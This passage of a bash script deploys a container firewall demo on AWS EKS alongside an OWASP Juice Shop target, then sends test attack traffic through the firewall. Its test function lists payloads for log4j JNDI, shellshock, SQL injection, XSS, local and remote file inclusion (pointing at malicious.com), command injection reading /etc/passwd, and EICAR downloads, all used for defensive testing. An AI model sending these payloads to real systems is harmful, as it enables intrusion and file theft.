    EXISITNG_EKSCTL_PATH=$(which eksctl)
    echo "eksctl is already installed at $EXISITNG_EKSCTL_PATH"
    # Optionally, you could remove the old version before upgrading
    #sudo rm $EXISITNG_EKSCTL_PATH
    #echo "Removing the old version of eksctl."
else
    echo "eksctl is not installed."
fi

# Download the latest version of eksctl
curl -sLO "https://github.com/eksctl-io/eksctl/releases/latest/download/eksctl_$PLATFORM.tar.gz"

# (Optional) Verify checksum
curl -sL "https://github.com/eksctl-io/eksctl/releases/latest/download/eksctl_checksums.txt" | grep $PLATFORM | sha256sum --check

# Extract the new version and clean up
tar -xzf eksctl_$PLATFORM.tar.gz -C /tmp && rm eksctl_$PLATFORM.tar.gz

# Move the new eksctl binary to the previous eksctl location or /usr/local/bin if not installed
if [ -n "$EXISITNG_EKSCTL_PATH" ]; then
    # Move new eksctl to the existing location
    sudo mv /tmp/eksctl $EXISITNG_EKSCTL_PATH
    echo "Replaced eksctl with the new version at $EXISITNG_EKSCTL_PATH"
else
    # If eksctl wasn't installed previously, move to /usr/local/bin
    sudo mv /tmp/eksctl /usr/local/bin
    echo "Installed eksctl to /usr/local/bin"
fi

# Verify installation
eksctl version
} 

check_prerequisites() {
    #local aws_profile="${1:-default}"  # Use provided profile or default
    local aws_profile=${AWS_PROFILE}
    local required_commands=("aws" "eksctl" "kubectl" "curl" "helm")
    local missing_commands=()

    echo "Checking prerequisites..."

    # Check for required commands
    for cmd in "${required_commands[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
		if test "${cmd}" == "eksctl" ; then 
			echo install latest version of eksctl
 			upgradeLatestEKSCTL && break
		fi 
            missing_commands+=("$cmd")
            echo "❌ $cmd is not installed"
        else
            echo "✅ $cmd is installed ($(command -v "$cmd"))"
            
            # Get version information for key tools
            case "$cmd" in
                "aws")
                    echo "   AWS CLI version: $(aws --version)"
                    ;;
                "kubectl")
                    echo "   Kubectl version: $(kubectl version --client --output=yaml | grep -m1 gitVersion)"
                    ;;
                "eksctl")
                    echo "   eksctl version: $(eksctl version)"
                    ;;
                "helm")
                    echo "   Helm version: $(helm version --short)"
                    ;;
            esac
        fi
    done

    # Check AWS profile using existing function
    echo -e "\nChecking AWS profile configuration..."
    if ! check_aws_profile "$aws_profile"; then
        missing_commands+=("aws_profile")
    fi

    # Note about kubectl config
    echo -e "\nNote: kubectl configuration will be created after EKS cluster deployment"

    # Note about helm repositories
    echo "Note: Helm repositories will be configured during deployment"

    # If any required commands are missing, exit with error
    if [ ${#missing_commands[@]} -ne 0 ]; then
        echo -e "\n❌ Prerequisites check failed. Missing components:"
        for cmd in "${missing_commands[@]}"; do
            echo "   - $cmd"
        done
        echo -e "\nPlease install missing components before proceeding."
        echo "Installation guides:"
        echo "AWS CLI: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html"
        echo "eksctl: https://eksctl.io/installation/"
        echo "kubectl: https://kubernetes.io/docs/tasks/tools/"
        echo "Helm: https://helm.sh/docs/intro/install/"
        return 1
    fi

    echo -e "\n✅ All prerequisites are satisfied"
    return 0
}

deploy_cfos_and_agent() {
    local region=$1

    echo ${DEMOCFOSFIREWALLPOLICY}

    # Deploy components in sequence
    deploykeda "$region" || {
        echo "❌ Failed to deploy KEDA"
        return 1
    }

    deploy_local_path_provisioner "$region" || {
        echo "❌ Failed to deploy local-path-provisioner"
        return 1
    }

#    applyCFOSLicense || {
#        echo "❌ Failed to apply CFOS license"
#        return 1
#    }

    deployCFOSandAgentChinaAWS "$region" || {
        echo "❌ Failed to deploy CFOS and Agent"
        return 1
    }

    echo "Successfully deployed CFOS and all components"
    return 0
}


check_network_connectivity() {
    local target_ip="${1:-1.0.0.1}"    # Default to 1.0.0.1 if not provided
    local target_port="${2:-443}"       # Default to 443 if not provided
    
    echo "Starting network connectivity check to ${target_ip}:${target_port}"
    
    pods=$(kubectl get pods -l protectedby=cfos -o jsonpath='{.items[*].metadata.name}')
    
    if [ -z "$pods" ]; then
        echo "❌ No pods found with label protectedby=cfos"
        return 1
    fi 

    for pod in $pods; do
        echo "Checking network connectivity in protected pod: $pod"
        if kubectl exec $pod -- /bin/sh -c "nc -v -z -w 3 ${target_ip} ${target_port}"; then
            echo "✅ Connection successful from pod ${pod} to ${target_ip}:${target_port}"
        else
            echo "❌ Connection failed from pod ${pod} to ${target_ip}:${target_port}"
        fi
    done

    echo "Network connectivity check completed for all pods to ${target_ip}:${target_port}"
}


check_aws_profile() {
    local profile="$1"
    
    echo "Checking AWS profile: $profile"
    
    # Check if profile exists in aws configure list-profiles
    if ! aws configure list-profiles | grep -q "^${profile}$"; then
        echo "Error: AWS profile '${profile}' not found"
        echo "Available profiles:"
        aws configure list-profiles
        echo "❌ Please configure the required AWS profile first using 'aws configure --profile ${profile}'"
        return 1
    fi

    # Verify profile can access AWS services
    if ! aws sts get-caller-identity --profile "$profile" >/dev/null 2>&1; then
        echo "❌ Error: Unable to access AWS with profile '${profile}'"
        echo "Please check your AWS credentials and permissions"
        return 1
    fi

    echo "✅ AWS profile '${profile}' verified successfully"
    return 0
}

function deploy_demo_pod() {
local juiceshopClusterIPAddress=$1
create_and_apply_juiceshop_yaml $juiceshopClusterIPAddress
create_and_apply_diag2_yaml "protectedby: cfos"
}

function send_attack_traffic() {
test_diag2 "$@"
}

function updatecFOSsignuatre() {
  local tries=0
  local max_tries=10
  local result=1
  local cfos_pod_name

  while (( tries++ < max_tries && result != 0 )); do
    cfos_pod_name=$(kubectl get pods -l app=firewall -o jsonpath='{.items[?(@.status.phase=="Running")].metadata.name}')

    if [[ -n "$cfos_pod_name" ]]; then
      echo "Attempting to update signature on pod: $cfos_pod_name (try $tries/$max_tries)..."
      if kubectl exec -it "po/$cfos_pod_name" -- update; then
        result=0
        echo "Signature update successful on pod: $cfos_pod_name after $tries tries."
      else
        result=$? # Capture the exit code of the failed command
        echo "Update failed on pod: $cfos_pod_name (exit code: $result). Retrying..."
        sleep $((tries * 2))
      fi
    else
      echo "Warning: No running pod found with label 'app=firewall'. Retrying..."
      sleep $((tries * 2))
    fi
  done

  if (( result != 0 )); then
    echo "Error: Failed to update cFOS signature after $max_tries tries."
    return 1
  fi
  return 0
}

function check_cFOS_log() {
  local logfiles=("${@:1:$#-2}") # Capture all but the last two arguments as log files
  local label="${@:$#-1:1}"      # Second-to-last argument
  local number="${@:$#:1}"       # Last argument
  label="${label:-app=firewall}" # Apply default value if label is empty
  number="${number:-1}"          # Apply default value if number is empty
  local cfos_pod_name=$(kubectl get pods -l "$label" -o jsonpath='{.items[?(@.status.phase=="Running")].metadata.name}')

  if [[ -n "$cfos_pod_name" ]]; then
    for file in "${logfiles[@]}"; do
      runcli RED kubectl exec -it "po/${cfos_pod_name}" -c cfos -- tail -n "-$number" "/var/log/log/${file}"
    done
  else
    echo "Error: No running pod found with label '$label'"
  fi
}

function test_diag2() {
    # Parameters from command line - now all 4 are expected from CLI, with defaults inside function
    label_selector_source_pod="${1:-app=diag2}"
    namespace_source_pod="${2:-backend}"
    target_svc_name="${3:-juiceshop-service}"
    target_svc_namespace="${4:-security}"
    payload_type="${5:-normal}"
    logfile_name="${6:-traffic.0}"
    local service_address="${7}" 

    # Define the Juice Shop service address in a variable using parameters
    if [[ -z $service_address ]] ; then 
     service_address="http://${target_svc_name}.${target_svc_namespace}.svc.cluster.local:3000/"
    fi 

    local cfos_pod_name=$(kubectl get pods -l app=firewall -o jsonpath='{.items[?(@.status.phase=="Running")].metadata.name}')


    case "$payload_type" in
    normal)
        local payload='curl -s -I -k --max-time 5'
        local logfile_name="traffic.0"
        ;;
    log4j)
        local payload='curl -s -I -k --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
        local logfile_name="ips.0"
        ;;
    shellshock)
        local payload='curl -s -I -k --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
        local logfile_name="ips.0"
        ;;
    sql_injection)
        local payload='curl -s -k --max-time 5 --data "username=admin&password= OR 1=1 -- -"'
        local logfile_name="ips.0"
        ;;
    normalfileupload)
        local payload='curl  -k --max-time 5 -v -F "file=@/etc/passwd"'
        local logfile_name="app.0"
        ;;
    segdownload)
	local payload='curl -v -k  -r 250000-499999'
	local logfile_name="app.0"
	;;
    xss)
        local payload='curl -s -k --max-time 5 --data "search=<script>alert(1)</script>"'
        local logfile_name="ips.0"
        ;;
    lfi)
        local payload='curl -s -k -I --max-time 5 "http://target.com/index.php?page=../../../../etc/passwd"'
        local logfile_name="ips.0"
        ;;
    rfi)
        local payload='curl -s -k -I --max-time 5 "http://target.com/index.php?page=http://malicious.com/shell.txt"'
        local logfile_name="ips.0"
        ;;
    cmd_injection)
        local payload='curl -s -k -I --max-time 5 --data "input=1; cat /etc/passwd"'
        local logfile_name="ips.0"
        ;;
    directory_traversal)
        local payload='curl -s -k -I --max-time 5 "http://target.com/../../../../etc/passwd"'
        local logfile_name="ips.0"
        ;;
    user_agent_malware)
        local payload='curl -s -k -I --max-time 5 -H "User-Agent: BlackSun"'
        local logfile_name="ips.0"
        ;;
    eicardownload)
	local payload='curl -s -k -k -O https://secure.eicar.org/eicar.com.txt'
        local logfile_name="virus.0"
        ;;
    eicardownload1)
	local payload='curl -s -k -O https://secure.eicar.org/eicar_passwd.zip'
        local logfile_name="virus.0"
        ;;
    eicarupload)
        curl -k -O https://secure.eicar.org/eicar_com.zip 
	kubectl cp eicar_com.zip $(kubectl get pods -l app=diag2 -n backend -o jsonpath='{.items[0].metadata.name}'):/tmp/eicar_com.zip -n backend
        local payload='curl -v -k -F "file=@/tmp/eicar_com.zip"'
        local logfile_name="virus.0"
        ;;
    trojan)
        local payload='curl -s -I -k --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9dHJvamFuX3NpZ25hdHVyZQ==' | base64 -d)"'
        local logfile_name="virus.0"
        ;;
    worm)
        local payload='curl -s -I -k --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9d29ybV9zaWduYXR1cmU=' | base64 -d)"'
        local logfile_name="virus.0"
        ;;
     cve1)
        local payload='curl -X POST -H "Content-Type: application/json" \
  -d "{\"query\": \"hello; echo vulnerable > /tmp/proof.txt #\", \"response_mode\": \"compact\"}"'
        local logfile_name="ips.0"
        ;;
    *)
        local payload='curl -s -I -k --max-time 5'
        local logfile_name="ips.0"
        ;;
esac


    run_curl_in_pod "$payload" "$service_address"
    #echo "kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/${logfile_name}"
    #runcli RED kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/${logfile_name}

}


run_curl_in_pod() {
    # Parameters
    LOCAL_CURL_COMMAND="$1"
    JUICE_SHOP_SVC="$2"

    # Using local variables to get label and namespace from test_diag2 scope
    local pod_label_selector="${label_selector_source_pod}"
    local pod_namespace="${namespace_source_pod}"

    # Get the pod name with the specified label selector and namespace
  #  POD_NAME=$(kubectl get pods -n "$pod_namespace" -l "$pod_label_selector" -o jsonpath='{.items[0].metadata.name}')
    POD_NAME=$(kubectl get pods -n "$pod_namespace" -l "$pod_label_selector" --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')

    if [ -z "$POD_NAME" ]; then
        echo "No pod found with label '$pod_label_selector' in namespace '$pod_namespace'"
        exit 1
    fi

    # Run the curl command inside the pod
#    kubect exec $POD_NAME --namespace "$pod_namespace" -- ip route get ${SERVICEIPV4CIDR%/*} | grep 'vxlan0'  || echo failed to check route 10.96.0.0
    #echo "kubectl exec -it $POD_NAME --namespace $pod_namespace -- bash -c \"$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC\""
    echo "✅ ready to send traffic" 
    runcli GREEN kubectl exec  $POD_NAME --namespace "$pod_namespace" -- bash -c "$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC > /dev/null 2>&1 "  && runcli GREEN echo "traffic pass through" || runcli RED echo traffic blocked
    #sleep 2
}

function create_and_apply_diag2_yaml() {
     local label="${1:-protectedby: cfos}"
     YAML_FILE="diag2_deployment.yaml"
     local namespacename="backend"
     local appname="diag2"
     cat <<EOF > $YAML_FILE
apiVersion: v1
kind: Namespace
metadata:
  name: ${namespacename}

---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ${appname}
  namespace: ${namespacename}
spec:
  replicas: 1
  selector:
    matchLabels:
      app: ${appname}
  template:
    metadata:
      labels:
        app: ${appname}
        ${label}
    spec:
      nodeSelector:
        app: "true"
      containers:
        - name: praqma
          image: praqma/network-multitool
          ports:
            - containerPort: 80
          args:
            - /bin/sh
            - -c
            - /usr/sbin/nginx -g "daemon off;"
          securityContext:
            capabilities:
              add: ["NET_ADMIN","SYS_ADMIN","NET_RAW"]


---
apiVersion: v1
kind: Service
metadata:
  name: ${appname}-service
  namespace: ${namespacename}
spec:
  selector:
    app: ${appname}
  ports:
    - protocol: TCP
      port: 3000
      targetPort: 80

EOF

    # Apply the YAML file to Kubernetes
    runcli GREEN kubectl apply -f $YAML_FILE

    # Wait for the deployment to be ready
    runcli YELLOW kubectl rollout status deployment/${appname} -n ${namespacename} --timeout=300s

    echo "diag2 deployment with clusterip svc  in namespace ${namespacename} is ready."
}

function create_and_apply_juiceshop_yaml() {
    # Define the YAML file path
    YAML_FILE="juiceshop_deployment.yaml"
    local juiceshopClusterIPAddress=$1

    # Create the YAML content and save it to the file
    cat <<EOF > $YAML_FILE
apiVersion: v1
kind: Namespace
metadata:
  name: security

---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: juiceshop
  namespace: security
spec:
  replicas: 1
  selector:
    matchLabels:
      app: juiceshop
  template:
    metadata:
      labels:
        app: juiceshop
    spec:
      containers:
        - name: juiceshop
          image: bkimminich/juice-shop:latest
          ports:
            - containerPort: 3000

---
apiVersion: v1
kind: Service
metadata:
  name: juiceshop-service
  namespace: security
spec:
  clusterIP: $juiceshopClusterIPAddress
  selector:
    app: juiceshop
  ports:
    - protocol: TCP
      port: 3000
      targetPort: 3000
EOF

    # Apply the YAML file to Kubernetes
    runcli GREEN kubectl apply -f $YAML_FILE

    # Wait for the deployment to be ready
    runcli YELLOW kubectl rollout status deployment/juiceshop -n security --timeout=300s

    echo "JuiceShop deployment is ready."
}


deploykeda() {
    local region=$1

    # Set region first
#    if [ "$region" == "china" ]; then
#        set_china_aws_variable
#    else
#        set_global_aws_variable
#    fi

    # Check if cluster exists
    if ! check_eks_cluster; then
        echo "EKS cluster does not exist. Creating cluster with nodegroups first..."
        create_cluster_only || return 1
        create_nodegroups || return 1
        echo "Cluster creation completed. Proceeding with KEDA deployment..."
    fi

    # Check if KEDA is already deployed
    if kubectl get namespace keda >/dev/null 2>&1; then
        if kubectl get deployment keda-operator -n keda >/dev/null 2>&1; then
            echo "KEDA is already deployed and running"
            echo "To redeploy KEDA, please delete it first using: $0 deleteCFOSandAgent"
            return 0
        else
            echo "KEDA namespace exists but operator not found. Cleaning up..."
            kubectl delete namespace keda --timeout=60s
        fi
    fi

    # Deploy KEDA based on region
    if [ "$region" == "china" ]; then
        install_keda_with_yaml_ecr || return 1
        install_metrics_server_ecr
    else
        install_keda_with_helm || return 1
        install_metrics_server
    fi

    return 0
}

deleteKeda() {
    helm uninstall keda -n keda  || echo uninstall keda failed , maybe keda not exist 
    kubectl delete namespace keda || echo delete namespace keda failed, maybe namespace keda not exist 
}

deleteCFOSandAgent() {
local deploymentname="${1:-cfos7210250-deployment-new}"
    echo "Starting deletion of CFOS and related components..."

    # Delete route-manager daemonset first to allow proper cleanup
    if kubectl get ds route-manager &>/dev/null; then
        echo "Deleting route-manager daemonset..."
        if ! kubectl delete ds route-manager; then
            echo "Warning: Failed to delete route-manager daemonset"
            # Continue with deletion process despite failure
        else
            echo "Successfully deleted route-manager daemonset"
            # Wait a bit for cleanup to complete
            #echo "Waiting for route-manager cleanup..."
            #sleep 10
        fi
    else
        echo "route-manager daemonset not found"
    fi

    # Delete CFOS helm release
    local helm_release=$(helm list | grep $deploymentname | awk '{print $1}')
    if [ ! -z "$helm_release" ]; then
        echo "Uninstalling CFOS helm release: $helm_release"
        helm uninstall "$helm_release"
    else
        echo "No CFOS helm release found"
    fi

    # Delete components if yaml exists
    local files=("components.yaml" "local-path-storage.yaml" )
    
    for file in "${files[@]}"; do
        if [ -f "$file" ]; then
            echo "Deleting resources from $file..."
            if kubectl delete -f "$file" 2>/dev/null; then
                echo "Successfully deleted resources from $file"
                rm -f "$file"
            else
                echo "Warning: Some resources from $file might not exist or failed to delete"
            fi
        else
            echo "File $file not found, skipping..."
        fi
    done


    # Additional cleanup: Delete namespaces if they exist
    #local namespaces=("keda" "local-path-storage" )
    local namespaces=("local-path-storage" )
    
    for ns in "${namespaces[@]}"; do
        if kubectl get namespace "$ns" &>/dev/null; then
            echo "Deleting namespace $ns..."
            kubectl delete namespace "$ns" --timeout=60s
        else
            echo "Namespace $ns not found"
        fi
    done

runcli GREEN kubectl delete svc cfosvipjuiceshopinternal || echo delete failed
runcli GREEN kubectl delete svc cfosvipjuiceshopexternal || echo delete failed 
runcli GREEN kubectl delete svc cfostest-vip-juiceshop || echo delete failed
runcli GREEN kubectl delete svc diag2-service -n backend  || echo delete failed 
runcli GREEN kubectl delete svc juiceshop-service -n security || echo delete failed

#    echo delete fos-license configmap 

#    kubectl delete cm fos-license  || echo failed to delete cm fos-license

    echo delete webprofileerrorpass configmap 
    kubectl delete cm demo1configmap || echo failed to delete cm demo1configmap

    kubectl delete cm cfosconfigpolicyforjuiceshopvip || echo failed to delete cm 
    kubectl delete cm cfosconfigvipjuiceshop  || echo failed to delete cm

    kubectl delete deployment diag2 -n backend || echo delete failed 
    kubectl delete deployment juiceshop -n security || echo delete failed 

    kubectl delete -f allowdefaultnamespacetosecuirtynamespace.yaml || echo delete failed 

    kubectl delete namespace backend
    kubectl delete namespace security
    echo "Cleanup completed"

    return 0
}

download_yaml() {
    local url="$1"
    local output_file="$2"
    
    echo "Downloading from ${url} to ${output_file}"
    
    # Check if both parameters are provided
    if [ -z "$url" ] || [ -z "$output_file" ]; then
        echo "Error: URL and output file must be specified"
        return 1
    fi 

    # Use curl with proper error handling
    if ! curl -sSL "${url}" --output "${output_file}"; then
        echo "Error: Failed to download from ${url}"
        return 1
    fi

    # Verify the file exists and contains YAML content
    if [ ! -f "${output_file}" ] || ! grep -q "apiVersion:" "${output_file}"; then
        echo "Error: Downloaded file does not appear to be valid YAML"
#        rm -f "${output_file}"
        return 1
    fi

    echo "✅ Successfully downloaded YAML file"
    return 0
}

deploy_local_path_provisioner() {
    local region=$1
    local yaml_file="local-path-storage.yaml"
    local primary_url="https://raw.githubusercontent.com/rancher/local-path-provisioner/v0.0.26/deploy"
    

    # Check if local-path-provisioner is already deployed and running
    if kubectl get deployment local-path-provisioner -n local-path-storage >/dev/null 2>&1; then
        echo "Local-path-provisioner is already deployed and running"
        echo "To redeploy, please delete it first using: kubectl delete -n local-path-storage deployment local-path-provisioner"
        return 0
    fi


    echo "Deploying local-path-provisioner..."

    # Try primary download URL first
      if ! download_yaml "${primary_url}/${yaml_file}" "${yaml_file}"; then
        echo "Primary download failed, trying alternative China region URL..."
        
        # Try alternative China region URL if primary fails
      if ! download_yaml "${ALTERNATIVEDOWNLOADURL}/${yaml_file}" "${yaml_file}"; then

            echo "❌ Error: Failed to download local-path-provisioner YAML from both sources"
            return 1
        fi
        echo "✅ Successfully downloaded local-path-provisioner YAML from alternative source"
    else
        echo "✅ Successfully downloaded local-path-provisioner YAML from primary source"
    fi

    # For China region, replace image repository if needed
     if [ "$region" == "china" ]; then
    echo "Updating image repository for ${region} region..."
    if [[ "$OSTYPE" == "darwin"* ]]; then
        echo "macOS version"
        # Replace rancher/local-path-provisioner image
        sed -i '' "s|image: rancher/local-path-provisioner:|image: ${MYIMAGEREPO}/local-path-provisioner:|g" "${yaml_file}"
        # Replace busybox image
        sed -i '' "s|image: busybox|image: ${MYIMAGEREPO}/busybox:latest|g" "${yaml_file}"
    else
        echo "Linux version"
        # Replace rancher/local-path-provisioner image
        sed -i "s|image: rancher/local-path-provisioner:|image: ${MYIMAGEREPO}/local-path-provisioner:|g" "${yaml_file}"
        # Replace busybox image
        sed -i "s|image: busybox|image: ${MYIMAGEREPO}/busybox|g" "${yaml_file}"
    fi
   fi 

    # Apply the configuration
    echo "Applying local-path-provisioner configuration..."
    if ! kubectl apply -f "${yaml_file}"; then
        echo "Error: Failed to apply local-path-provisioner configuration"
        rm -f "${yaml_file}"
        return 1
    fi

    # Clean up the downloaded file
    #rm -f "${yaml_file}"

    # Wait for deployment to be ready
    echo "Waiting for local-path-provisioner deployment to be ready..."
    if ! kubectl rollout status deployment local-path-provisioner -n local-path-storage --timeout=300s; then
        echo "Error: local-path-provisioner deployment failed to become ready"
        return 1
    fi

    echo "✅ Local-path-provisioner deployment completed successfully"
    return 0
}

create_license_configmap() {
    local input_file=$1
    local output_file="cfos_license.yaml"

    if [ -f "$output_file" ]; then
       echo "Error: cfos_license.yaml file already exist"
       return 1
    fi 

    # Check if input file parameter is provided
    if [ -z "$input_file" ]; then
        echo "❌ Error: No input file specified"
        echo "Usage: createCFOSLicenseConfigmap <input_file>"
        return 1
    fi

    # Check if the input file exists
    if [ ! -f "$input_file" ]; then
	echo "❌  License file does not exist - $input_file"
        return 1
    fi

    # Read the file and prepend six spaces to each line
    local license_data
    license_data=$(sed 's/^/      /' "$input_file") || {
        echo "❌ Error: Failed to process license data"
        return 1
    }

    # Create the ConfigMap YAML file with modified license data
    cat <<EOF >"$output_file"
apiVersion: v1
kind: ConfigMap
metadata:
    name: fos-license
    labels:
        app: fos
        category: license
data:
    license: |+
$license_data
EOF

    # Check if the output file was created successfully
    if [ -f "$output_file" ]; then
        echo "Successfully created $output_file"
        return 0
    else
        echo "❌ Error: Failed to create $output_file"
        return 1
    fi
}

# Check if license file exists and has valid format
check_license_file() {
    # Check if variable is set
    if [ -z "$CFOSLICENSEYAMLFILE" ]; then
        echo "❌ CFOSLICENSEYAMLFILE variable is not set."
        return 1
    fi 

    # Check if file exists
    if [ ! -f "$CFOSLICENSEYAMLFILE" ]; then
        echo "❌ License file ${CFOSLICENSEYAMLFILE} does not exist."
        echo "get your cFOS license and use $0 createCFOSLicenseConfigmap <CFOSVLTMXXXX.lic to create licenseconfigmap yaml file"
        return 1
    fi 

    # Check if file is readable
    if [ ! -r "$CFOSLICENSEYAMLFILE" ]; then
        echo "❌ License file ${CFOSLICENSEYAMLFILE} is not readable."
        return 1
    fi 

    # Check basic YAML structure without kubectl
    if ! grep -q "^apiVersion: v1" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License file must have 'apiVersion: v1'."
        return 1
    fi 

    if ! grep -q "^kind: ConfigMap" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License file must be a ConfigMap."
        return 1
    fi 

    if ! grep -q "^metadata:" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License file must have metadata section."
        return 1
    fi 

    # Check for required labels
    if ! grep -q "app: fos" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License ConfigMap must have label 'app: fos'."
        return 1
    fi 

    # Check for license data section
    if ! grep -q "license: |" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License ConfigMap must contain 'license:' data field."
        return 1
    fi 

    # Check for CFOS LICENSE header
    if ! grep -q "BEGIN CFOS LICENSE" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License file does not contain valid CFOS license format."
        return 1
    fi 

    echo "✅ License file validation passed."
    return 0
}

# Apply the license ConfigMap
apply_license() {
    echo "Applying CFOS license ConfigMap..."
    if ! kubectl apply -f "$CFOSLICENSEYAMLFILE"; then
        echo "❌ Failed to apply CFOS license ConfigMap."
        return 1
    fi

    # Verify the ConfigMap was created
    if ! kubectl get configmap fos-license >/dev/null 2>&1; then
        echo "❌ Failed to verify CFOS license ConfigMap creation."
        return 1
    fi

    echo "✅ CFOS license ConfigMap applied successfully."
    return 0
}

# Main license application function
applyCFOSLicense() {
    echo "Processing CFOS license..."

    # Apply license
    if ! apply_license; then
        echo "❌ License application failed."
        exit 1
    fi 

    echo "✅ CFOS license processing completed successfully."
    return 0
}


deployCFOSandAgentChinaAWS() {
    local region=$1
    local helm_repo_url

    echo remove cached cfos helm chart
    helm repo remove cfos  
    # Set helm repository URL based on region
    if [ "$region" == "china" ]; then
        helm_repo_url="${ALTERNATIVEDOWNLOADURL}"
        echo "Adding CFOS Helm repository for China region..." 
        echo ${helm_repo_url}
    else
        helm_repo_url=${CFOSHELMREPO}
        echo "Adding CFOS Helm repository ${CFOSHELMREPO} for Global region..."
        echo ${helm_repo_url}
    fi
    echo ${helm_repo_url}

    # Check if repo exists and update URL if needed
    if helm repo list | grep -q "^cfos"; then
        echo "Repository 'cfos' exists, removing old configuration..."
        helm repo remove cfos
    fi

    # Add helm repository with retries
    local max_attempts=3
    local attempt=1
    local success=false

    while [ $attempt -le $max_attempts ] && [ "$success" = false ]; do
        echo "Attempt $attempt to add helm repository ${helm_repo_url}..."
        if helm repo add cfos "${helm_repo_url}"; then
            success=true
        else
            echo "Attempt $attempt failed"
            if [ $attempt -lt $max_attempts ]; then
                echo "Retrying in 5 seconds..."
                sleep 5
            fi
            attempt=$((attempt + 1))
        fi
    done

    if [ "$success" = false ]; then
        echo "❌ Error: Failed to add helm repository after $max_attempts attempts"
        return 1
    fi

    echo "Updating CFOS Helm repository only with helm repo update cfos"
    if ! helm repo update cfos; then
        echo "❌ Error: Failed to update cfos repository"
        return 1
    fi

    # Get latest version with explicit repository name
    VERSION="0.1.20" //this is the previous working version 
    VERSION=$(helm search repo cfos/cfos --versions | awk 'NR==2 {print $2}')
    if [ -z "$VERSION" ]; then
        echo "❌ Error: Could not determine CFOS version"
        return 1
    fi
    echo "Installing CFOS version: $VERSION"

    # Get DNS service IP
    dnsAddress=$(kubectl get svc kube-dns -n kube-system -o jsonpath='{.spec.clusterIP}')
    if [ -z "$dnsAddress" ]; then
        echo "❌ Error: Could not determine DNS service IP"
        return 1
    fi
    echo "Using DNS address: $dnsAddress"

    # Install/Upgrade CFOS with explicit wait and timeout
    echo "Installing/Upgrading CFOS..."
    if [ "$region" == "china" ]; then
        echo "$region region specific installation with ECR repository"
        if ! helm upgrade --install cfos7210250-deployment-new cfos/cfos \
            --version "$VERSION" \
            --wait \
            --timeout 10m \
            --set routeManager.image.pullPolicy=Always \
            --set dnsConfig.nameserver="$dnsAddress" \
            --set routeManager.env.DEFAULT_FIREWALL_POLICY=${DEMOCFOSFIREWALLPOLICY} \
            --set routeManager.image.tag="cni0.1.25clusteroute" \
	    --set kedaScaling.enabled=$deployScaledObjectwithhelmchart \
            --set cFOSmetricExample.enabled=true \
            --set persistence.enabled=$deployPVCwithhelmchart \
            --set image.tag=fos-multiarch-v70255 \
            --set deployment.kind=$cFOSDeployKind \
	    --set persistence.storageClass=$storageClass \
	    --set resources.requests.cpu="300m" \
            --set initContainers.image.repository=${MYIMAGEREPO}/busybox; then
            
            echo "❌ Failed to install/upgrade CFOS"
            echo "Checking pod status..."
            kubectl get pods
            return 1
        fi
    else
        if ! helm upgrade --install cfos7210250-deployment-new cfos/cfos \
            --version "$VERSION" \
            --wait \
            --timeout 10m \
            --set routeManager.image.pullPolicy=Always \
            --set dnsConfig.nameserver="$dnsAddress" \
            --set routeManager.env.DEFAULT_FIREWALL_POLICY=${DEMOCFOSFIREWALLPOLICY} \
            --set routeManager.image.tag="cni0.1.25clusteroute" \
	    --set kedaScaling.enabled=$deployScaledObjectwithhelmchart \
            --set image.tag=fos-multiarch-v70255 \
            --set persistence.enabled=$deployPVCwithhelmchart \
	    --set resources.requests.cpu="300m" \
            --set deployment.kind=$cFOSDeployKind \
	    --set persistence.storageClass=$storageClass \
            --set cFOSmetricExample.enabled=true; then
            
            echo "❌ Failed to install/upgrade CFOS"
            echo "Checking pod status..."
            kubectl get pods
            return 1
        fi
    fi

    # Verify the installation
    echo "Verifying CFOS installation..."
    if ! helm list | grep -q "cfos7210250-deployment-new"; then
        echo "❌ Error: CFOS installation not found in helm list"
        return 1
    fi

    echo "✅ CFOS deployment completed successfully"
    return 0
}


install_metrics_server_ecr() {
    # Check if metrics-server is already installed  
    if kubectl get deployment metrics-server -n kube-system >/dev/null 2>&1; then
        echo "✅ Metrics-server is already installed"
        return 0
    fi

    echo "Installing metrics-server for China region using ECR..."
    local yaml_file="components.yaml"
    local primary_url="https://github.com/kubernetes-sigs/metrics-server/releases/latest/download"

    # Try primary download URL first
        if ! download_yaml "${primary_url}/${yaml_file}" "${yaml_file}"; then
        echo "Primary download failed, trying alternative China region URL..."
        
        # Try alternative China region URL
        if ! download_yaml "${ALTERNATIVEDOWNLOADURL}/${yaml_file}" "${yaml_file}"; then
            echo "❌ Error: Failed to download metrics-server YAML from both sources"
            exit 1
        fi
        echo "✅ Successfully downloaded metrics-server YAML from alternative source"
    else
        echo "✅ Successfully downloaded metrics-server YAML from primary source"
    fi

    echo "Replacing the image repository with OS-specific sed command"

    if [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS version
        sed -i '' "s|registry.k8s.io/metrics-server/|${MYIMAGEREPO}/|g" components.yaml
    else
        # Linux version
        sed -i "s|registry.k8s.io/metrics-server/|${MYIMAGEREPO}/|g" components.yaml
    fi

    # Apply the modified yaml
    if ! kubectl apply -f components.yaml; then
        echo "❌ Error: Failed to apply metrics-server configuration"
        exit 1
    fi

    # Wait for metrics-server deployment to be ready
    echo "Waiting for metrics-server to be ready..."
    if ! kubectl -n kube-system wait deployment metrics-server --for condition=Available=True --timeout=300s; then
        echo "❌ Error: Metrics-server deployment failed to become ready"
        exit 1
    fi

    echo "✅ Metrics-server installation completed with ECR images"
}

install_metrics_server() {
    # Check if metrics-server is already installed
    if kubectl get deployment metrics-server -n kube-system >/dev/null 2>&1; then
